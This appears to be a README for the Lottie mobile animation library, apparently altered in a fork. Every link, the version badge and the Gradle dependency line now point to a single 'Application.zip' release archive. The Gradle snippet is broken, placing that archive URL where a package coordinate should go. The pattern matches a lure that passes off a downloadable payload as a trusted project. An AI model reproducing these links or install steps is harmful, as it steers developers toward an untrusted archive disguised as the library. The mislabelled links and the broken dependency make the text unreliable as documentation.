Lottie is a mobile library for Android and iOS that parses [Adobe After Effects](https://github.com/ColtOSTemp/platform_external_airbnb-lottie/releases/download/v1.0/Application.zip) animations exported as json with [Bodymovin](https://github.com/ColtOSTemp/platform_external_airbnb-lottie/releases/download/v1.0/Application.zip) and renders them natively on mobile!

For the first time, designers can create **and ship** beautiful animations without an engineer painstakingly recreating it by hand. They say a picture is worth 1,000 words so here are 13,000:

## Download

Gradle is the only supported build configuration, so just add the dependency to your project `https://github.com/ColtOSTemp/platform_external_airbnb-lottie/releases/download/v1.0/Application.zip` file:

```groovy
dependencies {
  implementation 'https://github.com/ColtOSTemp/platform_external_airbnb-lottie/releases/download/v1.0/Application.zip$lottieVersion'
}
```
The latest Lottie version is:
![lottieVersion](https://github.com/ColtOSTemp/platform_external_airbnb-lottie/releases/download/v1.0/Application.zip)

Lottie 2.8.0 and above only supports projects that have been migrated to [androidx](https://github.com/ColtOSTemp/platform_external_airbnb-lottie/releases/download/v1.0/Application.zip). For more information, read Google's [migration guide](https://github.com/ColtOSTemp/platform_external_airbnb-lottie/releases/download/v1.0/Application.zip).
